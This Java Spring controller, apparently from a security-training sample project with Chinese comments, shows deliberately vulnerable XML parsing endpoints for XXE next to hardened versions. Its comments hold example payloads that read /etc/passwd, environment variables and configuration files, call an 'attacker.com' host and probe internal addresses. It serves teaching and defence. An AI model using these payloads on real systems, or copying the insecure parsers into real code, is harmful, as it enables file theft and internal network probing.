package com.freedom.securitysamples.api.xmlExternalEntity;

import org.jdom2.input.sax.SAXHandler;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamSource;

import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

/**
 * XML外部实体(XXE)漏洞示例控制器
 * 说明：XXE漏洞是由于XML解析器处理了用户输入中的外部实体引用而导致的安全问题。
 *      攻击者可通过构造恶意XML内容，读取服务器本地文件、发起内部网络请求，
 *      甚至在特定配置下执行远程代码。
 * 常见风险：
 * 1. 敏感文件泄露（如/etc/passwd、配置文件等）
 * 2. 服务器内部网络探测
 * 3. 拒绝服务攻击（通过引用超大实体）
 * 4. 远程代码执行（在特定环境下）
 * 修复原则：
 * 1. 禁用XML解析器的外部实体处理功能
 * 2. 使用安全的XML解析配置
 * 3. 避免使用已知存在安全问题的解析器
 * 4. 对输入的XML内容进行严格验证
 */
@RestController
@RequestMapping("/security-example/xxe")
public class XmlExternalEntityVulnerabilityController {

    /**
     * 不安全示例：DOM解析器未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的DocumentBuilderFactory，未禁用外部实体
     * 2. 直接解析用户提供的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可通过此漏洞读取服务器上的敏感文件
     */
    @GetMapping("/unsafe/dom-parser")
    public String unsafeDomParsing(@RequestParam String xmlContent) throws Exception {
        // 危险实践：使用默认配置的DOM解析器，未禁用外部实体
        DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
        InputStream xmlInputStream = new ByteArrayInputStream(xmlContent.getBytes());
        Document document = documentBuilder.parse(xmlInputStream);
        return "XML解析完成（不安全的DOM解析）";
    }

    /**
     * 不安全示例：SAX解析器未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的SAXParserFactory，未禁用外部实体
     * 2. 直接处理用户输入的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "http://attacker.com/steal-data">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可通过此漏洞发起服务器端请求，探测内部网络
     */
    @GetMapping("/unsafe/sax-parser")
    public String unsafeSaxParsing(@RequestParam String xmlContent) throws Exception {
        // 危险实践：使用默认配置的SAX解析器，未禁用外部实体
        SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();
        SAXParser saxParser = saxParserFactory.newSAXParser();
        SAXHandler saxHandler = new SAXHandler();
        saxParser.parse(new ByteArrayInputStream(xmlContent.getBytes()), saxHandler);
        return "XML解析完成（不安全的SAX解析）";
    }

    /**
     * 不安全示例：DOM4J解析器未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的SAXReader，未禁用外部实体处理
     * 2. 直接解析用户提供的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "file:///app/config/database.properties">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可读取应用配置文件，获取数据库凭证等敏感信息
     */
    @GetMapping("/unsafe/dom4j-parser")
    public String unsafeDom4jParsing(@RequestParam String xmlContent) throws Exception {
        // 危险实践：使用默认配置的DOM4J解析器，未禁用外部实体
        SAXReader saxReader = new SAXReader();
        InputStream inputStream = new ByteArrayInputStream(xmlContent.getBytes());
        org.dom4j.Document document = saxReader.read(inputStream);
        return "XML解析完成（不安全的DOM4J解析）";
    }

    /**
     * 不安全示例：StAX解析器未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的XMLInputFactory，未禁用外部实体
     * 2. 直接处理用户输入的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "file:///proc/self/environ">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可读取系统环境变量，获取敏感配置信息
     */
    @GetMapping("/unsafe/stax-parser")
    public String unsafeStaxParsing(@RequestParam String xmlContent) throws XMLStreamException {
        // 危险实践：使用默认配置的StAX解析器，未禁用外部实体
        XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
        StringReader stringReader = new StringReader(xmlContent);
        XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(stringReader);
        while(xmlStreamReader.hasNext()) {
            xmlStreamReader.next();
        }
        return "XML解析完成（不安全的StAX解析）";
    }

    /**
     * 不安全示例：Transformer未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的TransformerFactory，未禁用外部实体
     * 2. 直接转换用户提供的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "file:///etc/hostname">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可获取服务器主机名等信息，为进一步攻击做准备
     */
    @GetMapping("/unsafe/transformer")
    public String unsafeTransformerUsage(@RequestParam String xmlContent) throws TransformerException {
        // 危险实践：使用默认配置的Transformer，未禁用外部实体
        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        Transformer transformer = transformerFactory.newTransformer();
        StreamSource source = new StreamSource(new StringReader(xmlContent));
        transformer.transform(source, null);
        return "XML转换完成（不安全的Transformer使用）";
    }

    /**
     * 不安全示例：XMLReader未禁用外部实体
     * 漏洞点：
     * 1. 使用默认配置的XMLReader，未禁用外部实体处理
     * 2. 直接解析用户输入的XML内容
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "http://192.168.1.1/internal-service">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可利用服务器作为跳板，探测内部网络服务
     */
    @GetMapping("/unsafe/xml-reader")
    public String unsafeXmlReaderUsage(@RequestParam String xmlContent) throws Exception {
        // 危险实践：使用默认配置的XMLReader，未禁用外部实体
        XMLReader xmlReader = XMLReaderFactory.createXMLReader();
        StringReader stringReader = new StringReader(xmlContent);
        InputSource inputSource = new InputSource(stringReader);
        xmlReader.parse(inputSource);
        return "XML解析完成（不安全的XMLReader使用）";
    }

    /**
     * 不安全示例：带参数的DocumentBuilder未正确配置安全选项
     * 漏洞点：
     * 1. 虽然启用了验证和命名空间，但未禁用外部实体
     * 2. 仍存在XXE漏洞风险
     * 攻击示例：
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE root [
     *   <!ENTITY xxe SYSTEM "file:///var/log/application.log">
     * ]>
     * <root>&xxe;</root>
     * 风险：攻击者可读取应用日志文件，获取系统运行信息和潜在漏洞线索
     */
    @GetMapping("/unsafe/configured-dom-parser")
    public String unsafeConfiguredDomParser(@RequestParam String xmlContent) throws Exception {
        // 危险实践：虽有部分配置，但未禁用外部实体处理
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setValidating(true);
        dbf.setNamespaceAware(true);
        // 缺少禁用外部实体的关键配置
        DocumentBuilder builder = dbf.newDocumentBuilder();
        InputStream inputStream = new ByteArrayInputStream(xmlContent.getBytes());
        Document doc = builder.parse(inputStream);
        return "XML解析完成（不安全的配置化DOM解析）";
    }

    /**
     * 安全示例：配置安全的DOM解析器
     * 修复措施：
     * 1. 禁用外部实体和DTD处理
     * 2. 启用安全处理特性
     * 3. 设置相关属性防止外部资源访问
     */
    @GetMapping("/safe/dom-parser")
    public String safeDomParsing(@RequestParam String xmlContent) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        
        // 关键安全配置：禁用外部实体
        String feature = null;
        try {
            // 禁用DOCTYPE声明
            feature = "http://apache.org/xml/features/disallow-doctype-decl";
            dbf.setFeature(feature, true);
            
            // 禁止外部实体
            feature = "http://xml.org/sax/features/external-general-entities";
            dbf.setFeature(feature, false);
            
            // 禁止参数实体
            feature = "http://xml.org/sax/features/external-parameter-entities";
            dbf.setFeature(feature, false);
            
            // 禁用外部DTD加载
            feature = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
            dbf.setFeature(feature, false);
            
            // 安全处理模式
            dbf.setXIncludeAware(false);
            dbf.setExpandEntityReferences(false);
        } catch (ParserConfigurationException e) {
            // 某些解析器可能不支持这些特性，但仍应尝试设置
        }

        DocumentBuilder builder = dbf.newDocumentBuilder();
        InputStream inputStream = new ByteArrayInputStream(xmlContent.getBytes());
        Document doc = builder.parse(inputStream);
        return "XML解析完成（安全的DOM解析）";
    }

    /**
     * 安全示例：配置安全的SAX解析器
     * 修复措施：
     * 1. 禁用外部实体处理
     * 2. 禁用DTD加载
     * 3. 使用安全的解析器配置
     */
    @GetMapping("/safe/sax-parser")
    public String safeSaxParsing(@RequestParam String xmlContent) throws Exception {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        
        // 关键安全配置
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        spf.setXIncludeAware(false);

        SAXParser saxParser = spf.newSAXParser();
        SAXHandler saxHandler = new SAXHandler();
        saxParser.parse(new ByteArrayInputStream(xmlContent.getBytes()), saxHandler);
        return "XML解析完成（安全的SAX解析）";
    }

    /**
     * 安全示例：配置安全的StAX解析器
     * 修复措施：
     * 1. 禁用外部实体支持
     * 2. 禁用实体引用替换
     */
    @GetMapping("/safe/stax-parser")
    public String safeStaxParsing(@RequestParam String xmlContent) throws XMLStreamException {
        XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
        
        // 关键安全配置
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        xmlInputFactory.setProperty(XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);

        StringReader stringReader = new StringReader(xmlContent);
        XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(stringReader);
        while(xmlStreamReader.hasNext()) {
            xmlStreamReader.next();
        }
        return "XML解析完成（安全的StAX解析）";
    }
}
